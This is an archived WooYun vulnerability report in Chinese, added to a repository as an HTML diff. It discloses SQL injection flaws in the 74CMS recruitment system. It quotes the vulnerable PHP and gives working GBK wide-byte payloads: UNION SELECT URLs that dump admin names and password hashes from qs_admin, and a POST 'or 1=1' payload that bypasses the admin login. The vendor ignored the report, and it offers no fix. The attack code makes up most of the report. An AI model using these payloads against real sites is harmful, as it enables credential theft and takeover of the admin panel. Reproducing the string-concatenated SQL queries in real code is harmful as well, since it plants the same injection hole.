@@ -1,0 +1,324 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		74CMS 人才系统注入全版本通杀进后台  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		74CMS 人才系统注入全版本通杀进后台  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小屁孩">小屁孩</a> 
+</li><li>提交时间：		2012-07-30 14:27</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-07-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-08-04：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">整套程序过滤的还是比较全面的  不过所有版本都是GBK编码是他的硬伤  但是基本上字符串入库的时候作者都使用了iconv来把提交过来的数据编码转换成utf8<br />
+<br />
+所以利用宽字符注入就没办法了  但是过滤完善仅限3.2版本之前  最新的3.2版本plus目录多了几个文件  不知道是不是换了程序员了... 先上两个白痴注入吧~<br />
+<br />
+</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">注射1: <br />
+<br />
+</p><pre><code>\plus\ajax_officebuilding.php (16行)<br />
+<br />
+if($act == &#039;alphabet&#039;)<br />
+{<br />
+        $alphabet=trim($_GET[&#039;x&#039;]); //笑嘻嘻  肯定是换程序员了 不解释<br />
+        if (!empty($alphabet))<br />
+        {<br />
+$result = $db-&gt;query(&quot;select * from &quot;.table(&#039;category&#039;).&quot; where c_alias=&#039;QS_officebuilding&#039; AND c_index=&#039;{$alphabet}&#039; &quot;); //笑嘻嘻<br />
+        while($row = $db-&gt;fetch_array($result))<br />
+        {<br />
+                if ($listtype==&quot;li&quot;)<br />
+                {<br />
+                $htm.=&quot;&lt;li  title=\&quot;{$row[&#039;c_name&#039;]}\&quot; id=\&quot;{$row[&#039;c_id&#039;]}\&quot;&gt;{$row[&#039;c_name&#039;]}&lt;/li&gt;&quot;;<br />
+                }<br />
+                else<br />
+                {<br />
+                $htm.=&quot;&lt;li&gt;&lt;a href=\&quot;?officebuildingid={$row[&#039;c_id&#039;]}\&quot; title=\&quot;{$row[&#039;c_note&#039;]}\&quot; class=\&quot;vtip\&quot;&gt;{$row[&#039;c_name&#039;]}&lt;/a&gt;&lt;span&gt;{$row[&#039;stat_jobs&#039;]}&lt;/span&gt;&lt;/li&gt;&quot;;<br />
+                }<br />
+        }<br />
+        if (empty($htm))<br />
+        {<br />
+        $htm=&quot;&lt;span class=\&quot;noinfo\&quot;&gt;没有找到首字母为：&lt;span&gt;{$alphabet}&lt;/span&gt;  的写字楼！&lt;/span&gt;&quot;;<br />
+        }<br />
+        $htm.=&quot;&lt;script type=\&quot;text/javascript\&quot;&gt; vtip();&lt;/script&gt;&quot;;<br />
+        exit($htm);<br />
+        }<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+注射2: \plus\ajax_street.php (16行)<br />
+<br />
+</p><pre><code>if($act == &#039;alphabet&#039;)<br />
+{<br />
+        $alphabet=trim($_GET[&#039;x&#039;]);  //几乎和上面一个注入一模一样的  不多说了<br />
+        if (!empty($alphabet))<br />
+        {<br />
+$result = $db-&gt;query(&quot;select * from &quot;.table(&#039;category&#039;).&quot; where c_alias=&#039;QS_street&#039; AND c_index=&#039;{$alphabet}&#039; &quot;);//笑嘻嘻<br />
+        while($row = $db-&gt;fetch_array($result))<br />
+        {<br />
+                if ($listtype==&quot;li&quot;)<br />
+                {<br />
+                $htm.=&quot;&lt;li  title=\&quot;{$row[&#039;c_name&#039;]}\&quot; id=\&quot;{$row[&#039;c_id&#039;]}\&quot;&gt;{$row[&#039;c_name&#039;]}&lt;/li&gt;&quot;;<br />
+                }<br />
+                else<br />
+                {<br />
+                $htm.=&quot;&lt;li&gt;&lt;a href=\&quot;?streetid={$row[&#039;c_id&#039;]}\&quot; title=\&quot;{$row[&#039;c_note&#039;]}\&quot; class=\&quot;vtip\&quot;&gt;{$row[&#039;c_name&#039;]}&lt;/a&gt;&lt;span&gt;{$row[&#039;stat_jobs&#039;]}&lt;/span&gt;&lt;/li&gt;&quot;;<br />
+                }<br />
+        }<br />
+        if (empty($htm))<br />
+        {<br />
+        $htm=&quot;&lt;span class=\&quot;noinfo\&quot;&gt;没有找到首字母为：&lt;span&gt;{$alphabet}&lt;/span&gt;  的道路！&lt;/span&gt;&quot;;<br />
+        }<br />
+        exit($htm);<br />
+        }<br />
+}<br />
+Exp:<br />
+<br />
+1. plus/ajax_officebuilding.php?act=alphabet&amp;x=11%d5&#039;%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,concat(0x3C623E5E5F5E203C2F623E,admin_name,0x3A,pwd,0x3C623E205E5F5E3C2F623E),9%20from%20qs_admin%23<br />
+<br />
+2. plus/ajax_street.php?act=alphabet&amp;x=11%d5&#039;%20union%20select%201,2,3,concat(0x3C2F613E20),5,6,7,concat(0x3C623E5E5F5E203C2F623E,admin_name,0x3A,pwd,0x3C623E205E5F5E3C2F623E),9%20from%20qs_admin%23</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/29214446173afe3d41f3aafa9dd7aadbafa4b14e.png" target="_blank"><img src="../images/29214446173afe3d41f3aafa9dd7aadbafa4b14e.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+读过这程序的应该都知道有注入也是白搭 因为hash解不出来 我没仔细看他的密码加密方式 反正是多次加密的 试了十几个一个都没解出来....<br />
+<br />
+<br />
+<br />
+所以得来点杀伤力大的  不然不是白搞了吗  随后批量搜索了一些危险函数 执行 变量覆盖 写文件神马的 都没什么好的发现  继续把目标转向后台  立马就笑嘻嘻了~~<br />
+<br />
+</p><pre><code>\admin\admin_login.php (42行)<br />
+<br />
+elseif($act == &#039;do_login&#039;)<br />
+{<br />
+        header(&quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot;);<br />
+        header(&quot;Cache-Control: no-cache, must-revalidate&quot;);<br />
+        header(&quot;Pragma: no-cache&quot;);<br />
+         $admin_name = isset($_POST[&#039;admin_name&#039;]) ? trim($_POST[&#039;admin_name&#039;]) : &#039;&#039;; //没过滤~~~<br />
+         $admin_pwd = isset($_POST[&#039;admin_pwd&#039;]) ? trim($_POST[&#039;admin_pwd&#039;]) : &#039;&#039;;<br />
+        $postcaptcha = isset($_POST[&#039;postcaptcha&#039;]) ? $_POST[&#039;postcaptcha&#039;] : &#039;&#039;;<br />
+         $remember = isset($_POST[&#039;rememberme&#039;]) ? intval($_POST[&#039;rememberme&#039;]) : 0;<br />
+<br />
+         if($admin_name == &#039;&#039;)<br />
+        {<br />
+        header(&quot;Location:?act=login&amp;err=&quot;.urlencode(&#039;用户名不能为空&#039;));<br />
+        exit();<br />
+         }<br />
+         elseif($admin_pwd == &#039;&#039;)<br />
+        {<br />
+        header(&quot;Location:?act=login&amp;err=&quot;.urlencode(&#039;密码不能为空&#039;));<br />
+        exit();<br />
+         }<br />
+        $captcha=get_cache(&#039;captcha&#039;);<br />
+        if(empty($postcaptcha) &amp;&amp; $captcha[&#039;verify_adminlogin&#039;]==&#039;1&#039;)<br />
+        {<br />
+                header(&quot;Location:?act=login&amp;err=&quot;.urlencode(&#039;验证码不能为空&#039;));<br />
+                exit();<br />
+         }<br />
+        if ($captcha[&#039;verify_adminlogin&#039;]==&#039;1&#039; &amp;&amp; strcasecmp($_SESSION[&#039;imageCaptcha_content&#039;],$postcaptcha)!=0)<br />
+        {<br />
+                write_log(&quot;&lt;span style=\&quot;color:#FF0000\&quot;&gt;验证码填写错误&lt;/span&gt;&quot;,$admin_name,2);<br />
+                header(&quot;Location:?act=login&amp;err=&quot;.urlencode(&#039;验证码填写错误&#039;));<br />
+                exit();<br />
+        }<br />
+         elseif(check_admin($admin_name,$admin_pwd)) //关键函数  直接带入进去了<br />
+        {<br />
+                 update_admin_info($admin_name);<br />
+                write_log(&quot;成功登录&quot;,$admin_name);<br />
+                 if($remember == 1)<br />
+                {<br />
+                        $admininfo=get_admin_one($admin_name);<br />
+                         setcookie(&#039;Qishi[admin_id]&#039;, $_SESSION[&#039;admin_id&#039;], time()+86400, $QS_cookiepath, $QS_cookiedomain);<br />
+                         setcookie(&#039;Qishi[admin_name]&#039;, $admin_name, time()+86400, $QS_cookiepath, $QS_cookiedomain);<br />
+                        setcookie(&#039;Qishi[admin_pwd]&#039;, md5($admin_name.$admininfo[&#039;pwd&#039;].$admininfo[&#039;pwd_hash&#039;].$QS_pwdhash), time()+86400, $QS_cookiepath, $QS_cookiedomain);<br />
+                 }<br />
+         }<br />
+        else<br />
+        {<br />
+                write_log(&quot;&lt;span style=\&quot;color:#FF0000\&quot;&gt;用户名或密码错误&lt;/span&gt;&quot;,$admin_name,2);<br />
+                header(&quot;Location:?act=login&amp;err=&quot;.urlencode(&#039;用户名或密码错误&#039;));<br />
+                exit();<br />
+         }<br />
+header(&quot;Location: admin_index.php&quot;); <br />
+}</code></pre><p class='detail'><br />
+<br />
+继续追下check_admin函数: \admin\include\admin_common.fun.php (197行)<br />
+<br />
+</p><pre><code>function check_admin($name,$pwd)<br />
+{<br />
+      global $db,$QS_pwdhash;<br />
+<br />
+      $admin=get_admin_one($name); //先把程序name带入了这个函数进行了一次查询<br />
+      $md5_pwd=md5($pwd.$admin[&#039;pwd_hash&#039;].$QS_pwdhash);<br />
+      $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&#039;admin&#039;).&quot; WHERE admin_name=&#039;$name&#039; and pwd =&#039;&quot;.$md5_pwd.&quot;&#039; &quot;); //继续查询<br />
+      if($row[&#039;num&#039;] &gt; 0){<br />
+             return true;<br />
+      }else{<br />
+             return false;<br />
+      }<br />
+}</code></pre><p class='detail'><br />
+<br />
+再看看get_admin_one函数: \admin\include\admin_common.fun.php (237行)<br />
+<br />
+</p><pre><code>function get_admin_one($username){<br />
+        global $db;<br />
+        $sql = &quot;select * from &quot;.table(&#039;admin&#039;).&quot; where admin_name = &#039;&quot;.$username.&quot;&#039; LIMIT 1&quot;; //同样直接查询了<br />
+        return $db-&gt;getone($sql);<br />
+}</code></pre><p class='detail'><br />
+<br />
+get_admin_one函数和check_admin函数都是直接就带入查询了  除了POST开头被addslashes函数过滤过一次  但是在宽字符面前这些都是浮云~~<br />
+<br />
+<br />
+<br />
+so... 直接向 admin_login.php?act=do_login 构造以下POST语句就能直接进后台了~~  当然前提你得有后台路径:<br />
+<br />
+<br />
+<br />
+admin_name=fuckyou%d5&#039; or 1=1%23&amp;admin_pwd=1 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/2921461361b6b23e0378c2d536c1321f9d1fdb35.gif" target="_blank"><img src="../images/2921461361b6b23e0378c2d536c1321f9d1fdb35.gif" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">高人来吧 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小屁孩" title="小屁孩">小屁孩</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-010319" title="74CMS 人才系统注入全版本通杀进后台">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2012-07-30 14:27</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="10319";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
